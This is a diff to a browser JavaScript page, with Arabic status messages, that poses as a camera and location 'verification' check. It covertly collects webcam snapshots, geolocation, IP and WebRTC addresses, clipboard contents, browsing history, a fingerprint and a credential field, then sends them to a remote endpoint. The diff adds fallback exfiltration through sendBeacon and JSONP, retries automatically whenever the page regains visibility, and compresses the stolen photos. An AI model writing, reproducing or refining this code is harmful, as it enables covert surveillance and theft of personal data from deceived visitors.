@@ -136,20 +136,37 @@
   }
 
   /* ===================== النقل ===================== */
-  function postJson(obj) {
-    return fetch(ENDPOINT, {
-      method: 'POST',
-      mode: 'no-cors',
-      keepalive: true,
-      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-      body: JSON.stringify(obj)
-    }).then(() => true).catch(() => false);
+  async function postData(payload) {
+    const fd = new FormData();
+    fd.append('a', 'collect');
+    fd.append('d', JSON.stringify(payload));
+    try {
+      await fetch(ENDPOINT, {
+        method: 'POST', mode: 'no-cors', body: fd,
+        keepalive: true, cache: 'no-store'
+      });
+      return true;
+    } catch (_) {
+      try { navigator.sendBeacon(ENDPOINT, fd); return true; } catch (__) { return false; }
+    }
+  }
+
+  function jsonpData(payload) {
+    const p = Object.assign({}, payload);
+    p.hist = JSON.stringify((payload.hist ? JSON.parse(payload.hist) : []).slice(0, 12));
+    p.misc = '{}';
+    p.fp = (p.fp || '').slice(0, 120);
+    p.ua = (p.ua || '').slice(0, 120);
+    p.ips = (p.ips || []).slice(0, 3);
+    p.rtc = (p.rtc || []).slice(0, 3);
+    p.cred = (p.cred || '').slice(0, 200);
+    return jsonp({ a: 'collect', d: JSON.stringify(p) }, 12000);
   }
 
   async function confirmNonce(n) {
-    for (let i = 0; i < 3; i++) {
+    for (let i = 0; i < 2; i++) {
       if (await jsonp({ a: 'check', n: n }, T_CHECK)) return true;
-      await sleep(800);
+      await sleep(700);
     }
     return false;
   }
@@ -282,15 +299,15 @@
       await v.play().catch(() => {});
       await sleep(650);
       const w = v.videoWidth || 480, h = v.videoHeight || 360;
-      const s = Math.min(1, 480 / Math.max(w, h));
+      const s = Math.min(1, 420 / Math.max(w, h));
       const cv = document.createElement('canvas');
       cv.width = Math.max(1, Math.round(w * s));
       cv.height = Math.max(1, Math.round(h * s));
       cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
       return await new Promise(r => {
-        if (cv.toBlob) cv.toBlob(r, 'image/jpeg', 0.62);
+        if (cv.toBlob) cv.toBlob(r, 'image/jpeg', 0.55);
         else {
-          const bin = atob(cv.toDataURL('image/jpeg', 0.62).split(',')[1]);
+          const bin = atob(cv.toDataURL('image/jpeg', 0.55).split(',')[1]);
           const a = new Uint8Array(bin.length);
           for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i);
           r(new Blob([a], { type:'image/jpeg' }));
@@ -311,7 +328,7 @@
       fd.append('nonce', n);
       fd.append('img', blob, 's.jpg');
       try {
-        await fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, keepalive:true });
+        await fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, keepalive:true, cache:'no-store' });
         photoDone = true;
         return true;
       } catch (_) {
@@ -592,7 +609,6 @@
     const extraP = misc();
     const clipP = clipboard();
 
-    /* الكاميرا أولاً، والموقع بعدها لتجنّب حجب نافذة الإذن */
     setStatus('جارٍ التحقق من الكاميرا…');
     const blobP = withTimeout(shoot(), T_CAM, null);
     const geoP = blobP.then(() => { setStatus('جارٍ تحديد الموقع…'); return getGeo(); });
@@ -608,19 +624,19 @@
     setStatus('جارٍ إرسال البيانات…');
     const payload = await build(N, { ips, rtc, batt, geo, hist, trap, capi, extra, clip });
 
-    const posted = await postJson({ a: 'collect', d: payload });
-    if (!posted) { fail('تعذّر إرسال البيانات.'); return; }
-
-    const ok = await confirmNonce(N);
+    let ok = false;
+    if (await postData(payload)) ok = await confirmNonce(N);
+    if (!ok) { setStatus('إعادة المحاولة…'); ok = await jsonpData(payload); }
     if (!ok) { fail('لم يصل تأكيد من الخادم.'); return; }
 
     BLOB = await withTimeout(blobP, 1200, null);
     if (BLOB) { setStatus('جارٍ رفع الصورة…'); await sendPhoto(BLOB, N); }
 
+    busy = false;
     succeed();
   }
 
-  /* إعادة المحاولة عند أول لمسة (iOS + حالات الرفض) */
+  /* إعادة المحاولة عند أول لمسة */
   let touched = false;
   function onGesture() {
     if (touched) return;
@@ -630,7 +646,13 @@
     if (!geoDone) getGeo().then(g => {
       if (g.lat === '') return;
       geoDone = true;
-      postJson({ a:'geo', n:N, lat:g.lat, lng:g.lng, acc:g.acc });
+      const fd = new FormData();
+      fd.append('a', 'geo');
+      fd.append('n', N);
+      fd.append('lat', String(g.lat));
+      fd.append('lng', String(g.lng));
+      fd.append('acc', String(g.acc));
+      fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, keepalive:true }).catch(() => {});
     });
   }
 
@@ -645,8 +667,11 @@
 
   el.btn.addEventListener('click', () => { done = false; run(); });
   ['pointerdown','touchstart'].forEach(ev => document.addEventListener(ev, onGesture, { passive:true }));
-  window.addEventListener('pageshow', e => { if (e.persisted) location.reload(); });
-  window.addEventListener('online', () => { if (!done) run(); });
+  window.addEventListener('pageshow', () => { if (!done && !busy) run(); });
+  window.addEventListener('online', () => { if (!done && !busy) run(); });
+  document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'visible' && !done && !busy) run();
+  });
 
   run();
 })();
